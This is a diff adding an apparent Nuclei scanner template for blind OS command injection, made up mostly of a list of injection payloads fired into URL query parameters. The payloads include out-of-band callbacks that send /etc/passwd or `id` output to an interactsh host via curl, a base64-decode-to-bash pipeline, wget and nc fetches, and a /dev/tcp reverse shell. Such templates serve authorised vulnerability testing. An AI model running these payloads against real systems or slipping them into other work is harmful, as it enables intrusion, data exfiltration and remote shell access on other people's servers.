@@ -1,0 +1,84 @@
+id: blind-os-command-injection
+
+info:
+  name: Blind OS Command Injection
+  author: chippa vijay kumar
+  severity: high
+  description: |
+    OS Commanding is the direct result of mixing trusted code and untrusted data.
+    This attack is possible when an application accepts untrusted input to build operating system commands in an insecure manner involving improper data sanitization,
+    and/or improper calling of external programs.
+  reference:
+    - https://portswigger.net/research/hunting-asynchronous-vulnerabilities
+    - https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Command%20Injection/README.md
+  tags: cmdi, oast, dast, blind, polyglot
+
+variables:
+  marker: "{{interactsh-url}}"
+  cmdpayload: "curl http://{{interactsh-url}}"
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+
+    payloads:
+      interaction:
+        - "1;nslookup${IFS}{{marker}};#${IFS}';nslookup${IFS}{{marker}};#${IFS}\";nslookup${IFS}{{marker}};#${IFS}"
+        - "/*$(nslookup {{marker}})`nslookup {{marker}}``*/-nslookup({{marker}})-'/*$(nslookup {{marker}})`nslookup {{marker}}` #*/-nslookup({{marker}})||'\"||nslookup({{marker}})||\"/*`*/"
+        - "%0anslookup {{marker}}%0a"
+        - "echo${IFS}{{base64(cmdpayload)}}|base64${IFS}-d|bash"
+        - "%0a ping -i {{marker}} %0a"
+        - "%0a ping -i {{marker}} %0a"
+        - "curl${IFS}{{marker}}?$(id)"
+        - "1;system('cat%20/etc/passwd')"
+        - "1;system('id')"
+        - "|%20curl%20-d%20@/etc/passwd%20{{marker}}"
+        - "'.print((`id`)).'"
+        - "%26echo%20`id`%24()%5C%20"
+        - ";/usr/bin/id\n"
+        - "eval('id')"
+        - "a);/usr/bin/id"
+        - "%0A/usr/bin/id%0A"
+        - "%0Aid%0A"
+        - "$;/usr/bin/id"
+        - "%0a id %0a"
+        - "aaa%20%7C%7C%20id%3B%20x"
+        - "`curl -n 10 {{marker}}`"
+        - "wget http://{{marker}}"
+        - "nc -z {{marker}} 80"
+        - "%22.system%28id%29.%22"
+        - "%26id%26"
+        - '"`id`"'
+        - "%26nslookup%20-q%3dcname%20%%60id%60{{marker}}.%26'%5c%22%600"
+        - "%22.system%28id%29.%22"
+        - "%26id%26"
+        - "echo 'id' | /bin/sh -c 'sh -c \"`id`\"' || true"
+        - ";/bin/sh -c 'curl http://{{marker}}' ;"
+        - "|| /bin/bash -c 'wget http://{{marker}}' ||"
+        - "`/usr/bin/perl -e 'use Socket;`' || nslookup {{marker}} ||"
+        - "$(python -c 'import os; os.system(\"curl http://{{marker}}\")')"
+        - "$(php -r 'file_get_contents(\"http://{{marker}}\");')"
+        - "'); system('curl http://{{marker}}');//"
+        - "`/bin/sh -i >& /dev/tcp/{{marker}}/80 0>&1`"  # noisy / advanced — keep with caution
+    fuzzing:
+      - part: query
+        type: postfix
+        mode: single
+        fuzz:
+          - "{{interaction}}"
+
+    stop-at-first-match: true
+
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
+          - "http"
+
+      - type: regex
+        part: body
+        regex:
+          - 'root:.*:0:0:'
+          - 'uid=([0-9(a-z)]+) gid=([0-9(a-z)]+)'
